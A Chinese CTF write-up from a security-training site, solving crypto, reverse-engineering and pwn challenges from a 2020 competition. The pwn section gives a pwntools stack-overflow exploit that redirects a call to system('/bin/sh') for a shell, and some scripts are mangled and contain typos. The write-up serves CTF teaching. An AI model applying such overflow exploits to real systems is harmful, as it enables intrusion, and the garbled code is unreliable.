@@ -1,0 +1,423 @@
+原创 紫色仰望 合天智汇
+
+## 0x01 前言  
+
+这是2020年的第一场的ctf比赛，它已经结束两天，虽然好多大学生们都在准备着期末考试，但这个比赛的热度还有持续着呢，由于网络上关于这个比赛的题解，几乎很少或者不太详细，我就整理了一份详细的题解，没有全部记录，舍去了简单题的记录！并且本文中还夹有一些做题技巧，希望帮到大家！
+
+## 0x02 Crypto1  
+
+下载得到 encode.py，fflag.png，fflag_e.png，flag_e.flag 四个文件
+
+![v2-4551a3d12d6fea2b89314bff7bc278a1_hd.j](https://pic2.zhimg.com/80/v2-4551a3d12d6fea2b89314bff7bc278a1_hd.jpg)
+
+我们看下加密脚本encode.py 的内容：
+
+from itertools import *from key import key ki= cycle(key) fr1 =
+open("flag.png","rb")fr2 = open("fflag.png","rb")fw1 =
+open("flag_e.png","wb")fw2 = open("fflag_e.png","wb") for now in fr1: for
+nowByte in now: newByte = nowByte ^ ord(next(ki))
+fw1.write(bytes([newByte]))fr1.close()fw1.close() for now in fr2: for nowByte
+in now: newByte = nowByte ^ ord(next(ki))
+fw2.write(bytes([newByte]))fr2.close()fw2.close()
+
+我们简单分析下加密脚本encode.py：
+
+flag.png的每个字节与迭代器 ki[]中数据循环进行 亦或运算 得到 flag_e.flag fflag.png的每个字节与迭代器
+ki[]中数据循环进行 亦或运算 得到fflag_e.png 两个图片的 加密算法 是一样的
+
+思路很明确：要得到 flag.png:
+
+现在我们知道 fflag_e.png 和 fflag.png ，所以我们可以反推出 迭代器 ki[] 中的数据。然后 我们再通过ki[] 和
+flag_e.flag 反推出 flag.png
+
+迭代器 ki[]中数据 = fflag.png的每个字节 与fflag_e.png的每个字节 循环进行 亦或运算 flag.png的每个字节 = 迭代器
+ki[]中数据 与 flag_e.flag的每个字节 循环进行 亦或运算
+
+我们可以参考它给的 加密脚本encode.py 来写 出解密脚本decode1.py
+
+#coding:utf8 fflag= open("fflag.png","rb")fflag_e=
+open("fflag_e.png","rb")fflag_zijie=[]fflag_e_zijie=[]ki=[]for now in fflag:
+for nowByte in now: fflag_zijie.append(nowByte)#print fflag_zijieprint
+len(fflag_zijie)#5165for now in fflag_e: for nowByte in now:
+fflag_e_zijie.append(nowByte)# print fflag_e_zijieprint
+len(fflag_e_zijie)#5165 for i in range(len(fflag_zijie)):
+ki.append(ord(fflag_zijie[i])^ord(fflag_e_zijie[i]))#print ki#[65, 108, 105,
+116, 97, 95, 105, 115, 95, 115, 111, 95, 99, 117, 116, 101] 循环重复print
+len(ki)#5165fflag.close()fflag_e.close()flag= open("flag.png","wb")flag_e=
+open("flag_e.png","rb")flag_e_zijie=[]for now in flag_e: for nowByte in now:#
+通过迭代器逐行访问 flag_e_zijie.append(nowByte)# 通过迭代器逐字符处理# print flag_e_zijie #
+即我们可以得到密钥
+key_0=[65,108,105,116,97,95,105,115,95,115,111,95,99,117,116,101]key_0=[65,108,105,116,97,95,105,115,95,115,111,95,99,117,116,101]key=''for
+i in range(len(key_0)): key+=chr(key_0[i])print key;#Alita_is_so_cute
+
+现在我们得到了密钥 key="Alita_is_so_cute"，通过它生成迭代器 ki，进而反推出 flag.png
+
+#coding:utf8from itertools import *flag= open("flag.png","wb")flag_e=
+open("flag_e.png","rb")flag_e_zijie=[]key="Alita_is_so_cute"ki=cycle(key) for
+now in flag_e: for newByte in now: newByte=ord(newByte)^ord(next(ki))
+flag.write(bytes(chr(newByte))) flag.close()flag_e.close()
+
+运行，即可得到解密后的flag.png 图片 ，查看图片即可
+
+![v2-87382094ca33e707b0e760ac87e2196f_hd.j](https://pic3.zhimg.com/80/v2-87382094ca33e707b0e760ac87e2196f_hd.jpg)
+
+实验学习：CTF-Crypto练习：
+
+[课程:CTF-Crypto练习(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015011915525400001)
+
+Crypto是CTF竞赛中的主要题型之一，主要考查密码学相关知识点，CTF-Crypto系列实验覆盖了替换密码、RSA、AES等加密算法，以及中间人攻击、中间相遇攻击等知识点。
+
+## 003 扫雷 mine  
+
+我们下载后 得到一个 扫雷游戏的 mine.exe 游戏，打开后
+
+![v2-f99d5da5b31e3173086b4de58dcc0f60_hd.j](https://pic2.zhimg.com/80/v2-f99d5da5b31e3173086b4de58dcc0f60_hd.jpg)
+
+我刚看到这题，蒙了，我的天哪，扫雷啊！这怎么逆向，后来发现不过如此！
+
+首先，这个游戏的玩法和规则是 和我们平时玩的扫雷 游戏一样，
+
+扫雷失败，提示我们 "游戏结束"
+
+猜测，如果我们将 所有类都排出来 便后给我们flag！
+
+然后我们将它拖入ida 中，查看 main函数：
+
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp){
+FILE *v3; // rax CONSOLE_SCREEN_BUFFER_INFO csbi; // [rsp+20h] [rbp-30h]
+HANDLE handle_out; // [rsp+38h] [rbp-18h] int j_0; // [rsp+40h] [rbp-10h] int
+i_0; // [rsp+44h] [rbp-Ch] int j; // [rsp+48h] [rbp-8h] int i; // [rsp+4Ch]
+[rbp-4h] _main(); ::j = 1; v3 = __iob_func(); freopen(&Filename, "r", v3);
+while ( 1 ) { handle_out = GetStdHandle(0xFFFFFFF5);
+GetConsoleScreenBufferInfo(handle_out, &csbi); Hide(); Beginning(); a =
+GetTickCount(); do { while ( 1 ) { do { while ( kbhit() == 0 ) {
+Sleep(0xAu);LABEL_44: b = GetTickCount(); SetConsoleTextAttribute(handle_out,
+4u); position(80, 7); printf("用时："); // 游戏结束！ if ( b - a <= 0x927BF )
+printf("0"); printf("%d:", (b - a) / 0xEA60); if ( (b - a) / 0x3E8 % 0x3C <= 9
+) printf("0"); printf("%d:", (b - a) / 0x3E8 % 0x3C); if ( (b - a) / 0xA %
+0x64 <= 9 ) printf("0"); printf("%d", (b - a) / 0xA % 0x64); } spare[0] =
+getch(); } while ( spare[0] != -32 && spare[0] != 13 && spare[0] != 32 ); if (
+spare[0] != 13 ) goto LABEL_27; if ( mode & 1 ) break; if ( map[30 * floatx +
+floaty] == 64 && !flag[0][30i64 * floatx + floaty] ) goto LABEL_52; if (
+flag[0][30i64 * floatx + floaty] != 1 ) { Open(); position(0, 0);
+SetConsoleTextAttribute(handle_out, 2u); for ( i = 0; i <= 29; ++i ) { for ( j
+= 0; j <= 29; ++j ) Lump(i, j); printf("\n"); } position(2 * floaty, floatx);
+SetConsoleTextAttribute(handle_out, 1u); Lump(floatx, floaty); goto LABEL_27;
+} } } while ( map[30 * floatx + floaty] == 120 || map[30 * floatx + floaty] >
+48 && map[30 * floatx + floaty] <= 56 ); if ( flag[0][30i64 * floatx + floaty]
+) { --flagnum; flag[0][30i64 * floatx + floaty] = 0; } else { ++flagnum;
+flag[0][30i64 * floatx + floaty] = 1; } position(2 * floaty, floatx);
+SetConsoleTextAttribute(handle_out, 1u); Lump(floatx, floaty);LABEL_27: if (
+spare[0] == 32 ) Mode(); if ( spare[0] == -32 ) { news = getch(); Move(); }
+for ( i_0 = 0; i_0 <= 29; ++i_0 ) { for ( j_0 = 0; j_0 <= 29; ++j_0 ) { if (
+map[30 * i_0 + j_0] == 120 || map[30 * i_0 + j_0] > 48 && map[30 * i_0 + j_0]
+<= 56 ) ++game; } } if ( game != 601 ) { game = 1;
+SetConsoleTextAttribute(handle_out, 4u); position(80, 5); printf(&byte_486016,
+(unsigned int)(300 - flagnum)); goto LABEL_44; }LABEL_52: // 我们重点注意下 这个
+LABEL_52 中的内容 SetConsoleTextAttribute(handle_out, 4u); position(5, 5); if (
+game == 1 ) // 关键判断 { printf("游戏结束！"); } else { re(); // re()函数 是我们的关键函数 我们跟进去
+Sleep(0x186A0u); } position(5, 8); Sleep(0x3E8u); printf("任意键重玩");
+scanf("%c%c", spare, spare); system("cls"); position(0, 0); }}
+
+我们发现，代码量很大，但逆向的是找到我们想要的关键算法，得到目的信息，当然这里我们的目的信息就是 flag 了，我们根据字符串 "游戏结束" 定位到
+main函数几乎最下面的 LABEL_52 部分
+
+LABEL_52: // 我们重点注意下 这个 LABEL_52 中的内容 SetConsoleTextAttribute(handle_out, 4u);
+position(5, 5); if ( game == 1 ) // 关键判断 { printf("游戏结束！"); } else { re(); //
+re()函数 是我们的关键函数 我们跟进去 Sleep(0x186A0u); } position(5, 8); Sleep(0x3E8u);
+printf("任意键重玩"); scanf("%c%c", spare, spare); system("cls"); position(0, 0);
+}}
+
+根据注释中的关键 判断 进而 得知 re()函数 是我们的关键函数 我们跟进去
+
+void __cdecl re(){ int k_0; // [rsp+20h] [rbp-10h] int i_0; // [rsp+24h] [rbp-Ch] int k; // [rsp+28h] [rbp-8h] int i; // [rsp+2Ch] [rbp-4h] if ( game == 601
+) // 如果扫除的雷（应该是） =601 { for ( i = 0; i <= 37; ++i ) // 对 数组 flaga[i] 进行以下 运算 {
+flaga[i] -= j++; if ( j == 4 ) j = 0; } for ( k = 0; k <= 37; ++k ) // 输出 flag
+printf("%c", (unsigned int)flaga[k]); printf(" "); } else // 如果扫除的 雷（应该是）！=601
+{ // 对 数组 flagb[i] 进行以下 运算 for ( i_0 = 0; i_0 <= 46; ++i_0 ) { flagb[i_0] -=
+j++; if ( j == 4 ) j = 0; } for ( k_0 = 0; k_0 <= 46; ++k_0 ) // 输出
+printf("%c", (unsigned int)flagb[k_0]); printf(" "); }}
+
+真的是要我们自己玩通关的话，其实，也是可以出现flag的，但是 30*30 的扫雷，简直超级难扫除完，于是我们根据re()函数中 的 python 脚本去
+将 flag 跑出来！
+
+#coding:utf8j=1flaga=[0x67,0x6e,0x64,0x67,0x7c,0x67,0x34,0x30,0x62,0x66,0x66,0x33,0x3a,0x36,0x3c,0x62,0x62,0x37,0x3c,0x61,0x63,0x64,0x68,0x35,0x37,0x67,0x33,0x35,0x38,0x68,0x35,0x30,0x67,0x3a,0x3b,0x33,0x66,0x7f,0x26]for
+i in range(38): flaga[i]-=j j=j+1 if j==4: j=0print flagaflagaa=""for i in
+range(38): flagaa+=chr(flaga[i])print flagaa
+#运行便得到flag{e10adc3949ba59abbe56e057f20f883e}
+
+## 0x04 反编译不准确，就看汇编  
+
+问：这里我想大家可能会有个疑问，在re()函数中并没有对 j 赋值，所以我 python中的 j=1是如何来的？
+
+答：这里其实是因为 ida 中 的反编译 并不是 完全 完美的，会有一些 瑕疵，但一般出现反编译后的信息 不太准确时，我们就要去从汇编层面去看：
+
+![v2-2757d6b1bbe3218cef1d0691457e8d49_hd.j](https://pic4.zhimg.com/80/v2-2757d6b1bbe3218cef1d0691457e8d49_hd.jpg)
+
+于是，得到 j 初值 为 1
+
+## 0x05 idc 脚本 dump ida 中数据  
+
+我想这个，当然更多对 初学者而言，是最想知道的，因为我最初学逆向的时候，不会dump ida中的数据，简直很让人抓狂！
+
+我详细来记录下如何dump 数据，这里我选择 idc 脚本,就拿此题举例吧，
+
+if ( game == 601 ) // 如果 扫除的 雷（应该是） =601 { for ( i = 0; i <= 37; ++i ) // 对 数组
+flaga[i] 进行以下运算 { flaga[i] -= j++; if ( j == 4 ) j = 0; } for ( k = 0; k <=
+37; ++k ) // 输出 flag printf("%c", (unsigned int)flaga[k]); printf(" "); }
+
+我们要对数组 flaga[i] 进行运算，首先得要知道数组flaga[i]数据是什么，双击flaga：
+
+![v2-41bd6eee10a16856063f219ba1d3a939_hd.j](https://pic1.zhimg.com/80/v2-41bd6eee10a16856063f219ba1d3a939_hd.jpg)
+
+然后我们在 ida 菜单栏 点击 File->Script Command,打开命令行窗口
+
+![v2-d0d6aa2c3bf05098c1a2714f0d605b71_hd.j](https://pic1.zhimg.com/80/v2-d0d6aa2c3bf05098c1a2714f0d605b71_hd.jpg)
+
+我们第一步：选择idc，接着再写脚本，最后 Run
+
+![v2-05f08f75bd7c269041500d781091f17e_hd.j](https://pic4.zhimg.com/80/v2-05f08f75bd7c269041500d781091f17e_hd.jpg)
+
+输出得结果：在ida中得Output 显示
+
+auto i,start,end;start = 0x471020;end =
+0x4710BC;Message("\n---------\n");for(i=start;i<end;i=i+4){Message("0x%x,",Dword(i));}
+//跑出来得数组 flaga[i]
+(如下)：0x67,0x6e,0x64,0x67,0x7c,0x67,0x34,0x30,0x62,0x66,0x66,0x33,0x3a,0x36,0x3c,0x62,0x62,0x37,0x3c,0x61,0x63,0x64,0x68,0x35,0x37,0x67,0x33,0x35,0x38,0x68,0x35,0x30,0x67,0x3a,0x3b,0x33,0x66,0x7f,0x26
+
+当然，如果想要了解更多，可以百度 搜索 ” IDC脚本 “
+
+实验学习：CTF-REVERSE练习之逆向初探
+
+http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014111410002900001（通过具体的实例介绍Ollydbg/IDA
+Pro/PEiD等工具在逆向分析中的基本使用方法，考察选手的逆向分析与调试能力。）
+
+## 0x06 hijack  
+
+这道题，难度其实挺大，大概就十多个人做了出来！详细说下这题，希望可以帮到大家！内容较多，请详细看代码中注释。
+
+首先下载下来发现是：64位得elf 程序，简单运行下 ,他让我们输入 flag ，随便输入，不符合要求，返回我们 "Wrong try again!"
+
+~/桌面/yuandan/hijack$ ./hijack
+
+please input flagziseyangwangWrong try again!~/桌面/yuandan/hijack$
+我们将他拖入ida，看main 函数：__int64 __fastcall main(__int64 a1, char **a2, char **a3){
+int v3; // ST0C_4 char s; // [rsp+10h] [rbp-70h] unsigned __int64 v6; //
+[rsp+78h] [rbp-8h] v6 = __readfsqword(0x28u); memset(&s, 0, 0x64uLL);
+memset(::s, 0, 0x64uLL); puts("please input flag"); __isoc99_scanf("%60s",
+&s); //输入 v3 = strlen(&s); sub_401320(::s, (__int64)&s, v3); return 0LL;}
+
+主函数得程序逻辑，很简单 ，让我们输入 字符串，然后进入 函数sub_401320（）中：我们双击进去观察：
+
+signed __int64 __fastcall sub_401320(_BYTE *a1, __int64 a2, int a3){ _BYTE
+*v3; // rax _BYTE *v4; // ST20_8 _BYTE *v5; // rax _BYTE *v6; // rax _BYTE
+*v7; // rax _BYTE *v8; // rax _BYTE *v9; // rax _BYTE *v10; // rax int i; //
+[rsp+18h] [rbp-Ch] _BYTE *v13; // [rsp+1Ch] [rbp-8h] _BYTE *v14; // [rsp+1Ch]
+[rbp-8h] signed __int64 v15; // [rsp+1Ch] [rbp-8h] v13 = a1; for ( i = 0; i <
+a3 - 2; i += 3 ) { v3 = v13; v4 = v13 + 1; *v3 = (*(_BYTE *)(i + a2) >> 2) +
+48; v5 = v4++; *v5 = (16 * *(_BYTE *)(i + a2) & 0x30 | (*(_BYTE *)(i + 1LL +
+a2) >> 4) & 0xF) + 48; *v4 = (4 * *(_BYTE *)(i + 1LL + a2) & 0x3C | (*(_BYTE
+*)(i + 2LL + a2) >> 6) & 3) + 48; v6 = v4 + 1; v13 = v4 + 2; *v6 = (*(_BYTE
+*)(i + 2LL + a2) & 0x3F) + 48; } if ( i < a3 ) { v7 = v13; v14 = v13 + 1; *v7
+= (*(_BYTE *)(i + a2) >> 2) + 48; if ( i == a3 - 1 ) { *v14 = (16 * *(_BYTE
+*)(i + a2) & 0x30) + 48; v8 = v14 + 1; v15 = (signed __int64)(v14 + 2); *v8 =
+32; } else { *v14 = (16 * *(_BYTE *)(i + a2) & 0x30 | (*(_BYTE *)(i + 1LL +
+a2) >> 4) & 0xF) + 48; v9 = v14 + 1; v15 = (signed __int64)(v14 + 2); *v9 = (4
+* *(_BYTE *)(i + 1LL + a2) & 0x3C) + 48; } v10 = (_BYTE *)v15; v13 = (_BYTE
+*)(v15 + 1); *v10 = 32; } *v13 = 0; return v13 + 1 - a1;}
+
+无敌像是 base64 加密函数呐， 当然，这件简单 说下base加密 过程
+
+1\. 首先将原str按每三个字节 分组，每个分组 3* 8 =24 位，进而得到str的所有 24 个二进位组成的 二进制位
+
+2\. 然后将上面的 二进制位 按每6位再分成1组，3个字节可分为 4组
+
+3\. 每组 就6 位，在前面给他们都补上两个 0 ，便是3个字节可成功 加密成 4个字节
+
+如果想要详细地了解base64加密编码 可以在网上搜索下，或者在合天网安实验室学习，地址：
+
+[实验:Base64编码原理与应用(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECIDca55-efe6-43f7-997d-08d916955fc9)
+
+我们来看下这个base64加密函数，发现它并不是简单，我们在程序中找不到 table表，它采用了动态生成的方式，
+
+![v2-029c743d1e894030dc038cf1c995b9fc_hd.j](https://pic2.zhimg.com/80/v2-029c743d1e894030dc038cf1c995b9fc_hd.jpg)
+
+我们再继续向下看，发现魔改的 base64 加密结束后，我们继续回到我们的主函数，发现程序结束了，和我们最初运行程序的 逻辑
+不一致啊！我们字符串中也找不到关键字符串"Wrong try again!"
+
+我们再ida 函数栏，函数并不太多 ，我们去找下有用信息：
+
+sub_401216() ： void sub_401216(){ if ( (signed int)sub_4011A6() >= 0 )
+srand(0x21436587u); else srand(0x12345678u); //动态调试 srand 种子为其实是 0x12345678}
+sub_401250()函数： void sub_401250(){ signed int i; // [rsp+8h] [rbp-8h] //当种子 为
+0x12345678 动态调试查看或者 写脚本 // 可得到 经过此函数中的运算： // byte_404080[16]=[66, 250, 204,
+150, 144, 70, 112, 123, 93, 54, 128, 212, 10, 125, 248, 62] //
+byte_4040A0[16]=[146, 201, 52, 157, 186, 206, 146, 74, 233, 193, 214, 214,
+166, 34, 76, 213] signed int j; // [rsp+Ch] [rbp-4h] for ( i = 0; i <= 15; ++i
+) byte_404080[i] ^= rand() % 255; for ( j = 0; j <= 15; ++j ) byte_4040A0[j]
+^= rand() % 255;} sub_401738()函数：int sub_401738(){ size_t v0; // rax int
+result; // eax v0 = strlen(s); if ( !memcmp(s, &unk_4040C0, v0) ) result =
+printf("%s", byte_404080); else result = printf("%s", byte_4040A0); return
+result;}
+
+函数中的 memcmp函数 看起来很像我们 最终的 check 函数，这个操作真的厉害了，不动态的话，还以为 memcmp 函数 是 动态库中
+的呢，动态调试发现，其实它是自定义的函数，即sub_401557（）
+
+// 经过调试 我们可以知道 // a1 是我们 输入字符串经过魔改后 base加密后 的字符串// a3 是
+我们输入字符串经过魔改base64加密后的长度// a2 是unk_4040C0中的 数组[56]signed __int64 __fastcall
+sub_401557(const char *a1, const char *a2, unsigned int a3){ char v4; // bl
+unsigned int v5; // [rsp+Ch] [rbp-A4h] unsigned int i; // [rsp+28h] [rbp-88h]
+unsigned int j; // [rsp+2Ch] [rbp-84h] __int64 v8; // [rsp+30h] [rbp-80h]
+__int64 v9; // [rsp+38h] [rbp-78h] __int64 v10; // [rsp+40h] [rbp-70h] __int64
+v11; // [rsp+48h] [rbp-68h] __int64 v12; // [rsp+50h] [rbp-60h] __int64 v13;
+// [rsp+58h] [rbp-58h] __int64 v14; // [rsp+60h] [rbp-50h] __int64 v15; //
+[rsp+68h] [rbp-48h] __int64 v16; // [rsp+70h] [rbp-40h] __int64 v17; //
+[rsp+78h] [rbp-38h] __int64 v18; // [rsp+80h] [rbp-30h] __int64 v19; //
+[rsp+88h] [rbp-28h] int v20; // [rsp+90h] [rbp-20h] unsigned __int64 v21; //
+[rsp+98h] [rbp-18h] v5 = a3; v21 = __readfsqword(0x28u); if ( strlen(a1) != a3
+|| strlen(a2) != v5 ) // a2的长度是56，可以知道输入的字符串 一定是 42 位 return 0LL; v8 = 0LL; v9
+= 0LL; v10 = 0LL; v11 = 0LL; v12 = 0LL; v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 =
+0LL; v17 = 0LL; v18 = 0LL; v19 = 0LL; v20 = 0; memset(&v8, 0, 0x64uLL); for (
+i = 0; v5 > i; ++i ) // 循环 56 次 { v4 = a2[i]; *((_BYTE *)&v8 + (signed int)i)
+= v4 ^ rand() % 200;// 随机数种子是 0x12345678 } for ( j = 0; v5 > j; ++j ) { if (
+*((_BYTE *)&v8 + (signed int)j) != a1[j] ) return 0LL; } return 1LL;}
+
+经过我们静态分析和动态调试，发现程序的执行流程 是这样的
+
+首先程序 从 0x12345678 和 0x21436587 选择了前者 作为随机数种子
+
+然后 我们输入字符串 flag
+
+程序对其进行 魔改的base64 加密 得到 flag_encode 字符串
+
+flag_encode 字符串再与 经过运算后的unk_4040C0[56] 作比较要相等才可以
+
+所以，我们我们要想获得flag，首先要得到经过运算后的unk_4040C0[56]，然后进行 魔改的base64 解密即可
+
+首先我们来得到 运算后的unk_4040C0[56] 的数据是怎么样的
+
+#coding:utf8from ctypes import
+*libc=cdll.LoadLibrary("./libc.so.6")libc.srand(0x21436587) # 所以，这题我们 我们得选择
+程序没有选择的 随机数种子 0x21436587#libc.srand(0x12345678) #因为 随机数种子为 0x12345678 的时候 最后求得
+运算后的unk_4040C0[56] 为乱码#下面注释中的 数据 都是 以随机数种子为 0x12345678 求得的 byte_404080=[0x0A,
+0x16, 0x4A, 0x66, 0xF0, 0x2C, 0x5A, 0xE0, 0x0D, 0xEF,0xBB, 0xC1, 0xD5, 0x9C,
+0x8F,0x81]for i in range(16): n=libc.rand()%255
+byte_404080[i]=byte_404080[i]^nprint byte_404080#[66, 250, 204, 150, 144, 70,
+112, 123, 93, 54, 128, 212, 10, 125, 248, 62] byte_4040A0=[0x76, 0xF8, 0x19,
+0xEA, 0xF3, 0x95, 0xDE, 0x26, 0xC5, 0xAD, 0x0C, 0x58, 0x68, 0x01, 0xBC,
+0xC2]for i in range(16): n=libc.rand()%255
+byte_4040A0[i]=byte_4040A0[i]^nprint byte_4040A0#[146, 201, 52, 157, 186, 206,
+146, 74, 233, 193, 214, 214, 166, 34, 76, 213] a2=[0xE8, 0x05, 0x4E, 0xF1,
+0xF8, 0xFC, 0x5D, 0xD0, 0x06, 0x3D, 0x48, 0xC1, 0xE0, 0xF8, 0x11, 0xFB, 0xED,
+0x0D, 0xD6, 0xD9, 0x60, 0x1A, 0xC5, 0x2A, 0xF2, 0xA3, 0xC2, 0x24, 0x41, 0x46,
+0xF2, 0xC0, 0x0B, 0x10, 0x2E, 0xF6, 0x6A, 0xAC, 0x30, 0x03, 0x81, 0x1B, 0x41,
+0xC6, 0x79, 0x63, 0xBE, 0x9E, 0xD5, 0x20, 0x1F, 0xC1, 0xFE, 0x51, 0x02, 0xE1]
+#这里a2 即是unk_4040C0[56] 原来的数据v8='' for i in range(56):
+v8+=chr(a2[i]^libc.rand()%200)print v8 #v8 为运算后的unk_4040C0[56] #随机数种子0x214365#
+v8="I31OKTmdGf@cHUEWGdddGbI^I5mVBFMe=fEO<7EdGfPaJV53JemWCg@Q"
+
+最后我们再对 v8 进行 魔改 base 解密即可，我把上面的图，放在这方便查看：
+
+![v2-e8de5427f453f464e10eff4013229e86_hd.j](https://pic1.zhimg.com/80/v2-e8de5427f453f464e10eff4013229e86_hd.jpg)
+
+这个魔改base64 并没有像正常的base64 去查表，而是在取6位之后 +48 即"0", 当然 也相当于 查表
+
+我们在在写解密脚本的时候需要在 先将 v8 中的数据都先 - 48 即‘0’ 得到
+
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"表中的下标，通过下找到的table中的值就是正确的base64编码，然后再解码就是flag了
+
+所以 python 脚本 这样写：
+
+import base64v8 =
+'I31OKTmdGf@cHUEWGdddGbI^I5mVBFMe=fEO<7EdGfPaJV53JemWCg@Q'print
+len(v8)#56table =
+'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'flag = ''
+for i in range(56): flag += table[ord(v8[i])-48] flag =
+base64.b64decode(flag)print flag于是 得到
+falg：d0_nOt_d3bUg_M4_&nd_fIgu7e_0ut_h1jaCk_gOt!
+
+## 0x07 pwn_arg  
+
+首先 ，我们查看下 它的文件属性和开启了什么保护
+
+~/桌面/yuandan/arg$ file argarg: ELF 32-bit LSB executable, Intel 80386, version
+1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32,
+BuildID[sha1]=5ee08f2d1ba1c9bd7a5290db45978a949d7179ab, not
+stripped~/桌面/yuandan/arg$ checksec arg[*]
+'/home/ziseyangwang/\xe6\xa1\x8c\xe9\x9d\xa2/yuandan/arg/arg' Arch:
+i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabledPIE:
+No PIE (0x8048000) 32位的elf 程序，仅开启了 NX 保护 拖入ida 查看：int __cdecl main(int argc,
+const char **argv, const char **envp){ init();//初始化 return
+checker(305419896);} 我们进去checker(305419896) 函数 中：int __cdecl checker(int a1){
+char buf; // [esp+Eh] [ebp-3Ah] char name[4]; // [esp+2Ch] [ebp-1Ch] char *s;
+// [esp+34h] [ebp-14h] int (__cdecl *v5)(int); // [esp+38h] [ebp-10h] int v6;
+// [esp+3Ch] [ebp-Ch] v6 = 8; strcpy(name, "malloc"); //给局部变量 name 赋初值
+"malloc" printf("your input : "); read(0, &buf, 0x4Au); //这里明显存在 栈溢出漏洞 0x4A >
+0x3A strncpy(st, &buf, 8u);//将我们的输入的前8个字符赋值给全局变量st v5 = (int (__cdecl
+*)(int))load(name);//v5=malloc() if ( a1 != 0xDEADBEEF ) return puts("Think
+about it "); s = (char *)v5(v6); //malloc(v6) __isoc99_scanf("%s", s); return
+puts(s);}
+
+全局变量st：
+
+![v2-fc967467dc7f4fd4001dce04afb2880f_hd.j](https://pic2.zhimg.com/80/v2-fc967467dc7f4fd4001dce04afb2880f_hd.jpg)
+
+在这之前 我们要了解下 v5 = (int (__cdecl *)(int))load(name);
+
+void *__cdecl load(char *name){ char *v1; // eax void *handle; // [esp+8h]
+[ebp-10h] void *v4; // [esp+Ch] [ebp-Ch] handle = dlopen("/lib32/libc.so.6",
+258); if ( !handle ) { v1 = dlerror(); printf("dlopen - %s\n", v1); exit(0); }
+v4 = dlsym(handle, name); if ( !v4 ) { puts("Can't load function"); exit(0); }
+dlclose(handle); return v4;}
+
+这里的 load 函数，它是根据传入的参数 字符串name 进而找到的libc库中的函数地址 然后返回给了v5，
+
+我们来分析下 怎么 pwn 掉这个程序? 执行 system('/bin/sh') 。
+
+![v2-673e3c7ea04363bec3027542b893ef37_hd.j](https://pic4.zhimg.com/80/v2-673e3c7ea04363bec3027542b893ef37_hd.jpg)
+
+程序中的 read 函数 存在 栈溢出漏洞，buf 离ebp距离 为0x3A，但我们却可以读入 0x4A
+的数据，虽然可以溢出，但溢出去的长度太有限，于是我们考虑下 从 load(name) 函数 入手！
+
+构造payload：
+
+1\. system 是 libc 中 的函数，我们 将局部变量name 覆盖为 system
+
+2\. 我们将 v6 覆盖为 /bin/sh 所在的地址，即 st 地址
+
+3\. 全局变量st = payload 前 8个字符，paylaod前八个字符为 /bin/sh\x00
+
+4\. 当参数 a1为 0xDEADBEEF 时 才会 执行 v5(v6) ，所以我们还要将 参数 a1 覆盖为 0xDEADBEEF！
+
+详见下图：
+
+![v2-ea0865aa4f0984996107a9f7c98fc6de_hd.j](https://pic3.zhimg.com/80/v2-ea0865aa4f0984996107a9f7c98fc6de_hd.jpg)
+
+所以 payload 为payload="/bin/sh\x00".ljust(0x1e,"\x00")+"system\x00"
+#0x3a-0x1cpayload=payload.ljust(0x2e,"\x00")+p32(st_addr) #因为程序是32
+位程序payload=payload.0ljust(0x3e,"\x00") #ebppayload+=p32(0)
+#返回地址paylaod+=p32(0xdeadbeef) #参数 1
+
+python脚本 如下：#coding:utf8from pwn import *conn=process(./arg)
+payload="/bin/sh\x00".ljust(0x1e,"a")+"system\x00"
+#0x3a-0x1cpayload=payload.ljust(0x2e,"a")+p32(st_addr) #因为程序是32
+位程序payload=payload.0ljust(0x3e,"a") #ebppayload+=p32(0)
+#返回地址paylaod+=p32(0xdeadbeef) #参数 1 conn.recvuntil("your input :
+")conn.sendline(payload)conn.interactive()
+
+实验学习：CTF-PWN进阶训练
+
+[课程:CTF-PWN进阶训练(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=C172.19.104.182015111814415800001)
+
+旨在帮助CTF初学者快速掌握复杂PWN题型的基本解题思路与技巧，包括溢出模型、信息泄露、ROP等
+
+## 0x08 后记  
+
+我也想上年度评优作品啊！！！
+
+希望本文能给大家带来帮助！ 合天网安实验室挺好的，可以去看看呐!
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！
+
+  
+
